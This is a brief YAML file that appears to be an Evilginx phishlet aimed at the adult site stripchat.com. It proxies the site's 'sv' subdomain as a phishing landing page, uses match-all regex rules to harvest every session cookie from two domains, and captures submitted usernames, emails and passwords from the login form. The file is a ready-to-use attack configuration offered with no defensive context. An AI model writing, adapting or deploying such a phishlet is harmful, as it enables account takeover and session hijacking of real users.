name: 'stripchat2'
author: '@cwaizydee'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: true}
sub_filters:
  - {triggers_on: 'stripchat.com', orig_sub: 'sv', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
auth_tokens:
  - domain: 'stripchat.com'
    keys: ['.*,regexp']
  - domain: 'sv.stripchat.com'
    keys: ['.*,regexp']    
credentials:
  username:
    key: 'loginOrEmail'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'sv.stripchat.com'
  path: '/login'
